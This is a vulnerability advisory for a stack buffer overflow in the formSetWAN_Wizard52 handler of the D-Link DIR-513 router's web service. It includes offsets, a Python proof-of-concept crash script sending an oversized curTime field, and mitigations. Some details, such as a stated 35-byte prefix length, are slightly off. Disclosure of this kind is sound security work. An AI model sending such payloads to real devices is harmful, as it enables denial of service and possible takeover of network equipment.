## Vulnerability Report: D-Link DIR-513 Buffer Overflow

**Vulnerability Type:** Stack-based Buffer Overflow (CWE-121)

**Vendor:** D-Link

**Vendor Website:**

**Affected Object Type:** Network Equipment (Switches, Routers, etc.)

**Affected Product:** DIR-513

**Affected Versions:** A1 FW110, A2 FW110

**Component Vulnerability:** No

**Vulnerability Name:** D-Link DIR-513 `formSetWAN_Wizard52` Function Buffer Overflow (Binary Vulnerability)

**Version:** 1.10

### Vulnerability Description

D-Link DIR-513 is a network router manufactured by D-Link. A stack-based buffer overflow vulnerability exists in the Web service of the D-Link DIR-513 when processing form requests.

Within the `formSetWAN_Wizard52` function, the program retrieves the user-controllable `curTime` parameter via `websGetVar` without any length validation. The program then calls the unbounded `sprintf` function to concatenate the oversized `curTime` string into a fixed-size (200 bytes) stack buffer `v30`. An attacker can send a specially crafted HTTP POST request to trigger a stack overflow, overwriting the return address (located 232 bytes away from the buffer start). This can lead to a Denial of Service (DoS) or Remote Code Execution (RCE).

---

### Trigger Point

The vulnerability is located in the `formSetWAN_Wizard52` function (Address: `0x44a940`) of the network service program, specifically at the following statement: `sprintf(v30, "/Basic/Wizard_WAN_complete.asp?t=%s", v3);` (Address: `0x44ac84`)

**Trigger Condition:** The vulnerability is triggered when an HTTP POST request is sent to the `/formSetWAN_Wizard52` endpoint containing an excessively long `curTime` parameter.

---

### Proof of Concept (PoC)

```
import requests

TARGET_IP = "192.168.0.1"
url = f"http://{TARGET_IP}/goform/formSetWAN_Wizard52"

# 计算偏移量
PREFIX_LENGTH = len("/Basic/Wizard_WAN_complete.asp?t=")  # 35 字节
BUFFER_SIZE = 200
OFFSET_TO_RA = 232

# 构造 payload
padding = b'A' * (OFFSET_TO_RA - PREFIX_LENGTH + 10)

payload = padding 

data = {
    "curTime": payload,
    "config.wan_ip_address": "192.168.0.100"
}


try:
    response = requests.post(url, data=data, timeout=5)
    print(f"Response Status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request failed (Possible crash): {e}")
```



---

### Solutions

#### Temporary Mitigation:

1. **Input Validation:** Implement length validation for the `curTime` parameter, restricting it to a reasonable limit (e.g., maximum 64 bytes) and rejecting any requests that exceed this limit.

2. **Access Control:** Restrict access to the Web management interface to trusted internal IP addresses only to reduce the attack surface for remote attackers.

#### Official Fix:

Replace the high-risk `sprintf` function with a safe, bounds-checked alternative: `snprintf(v30, sizeof(v30), "/Basic/Wizard_WAN_complete.asp?t=%s", v3);`
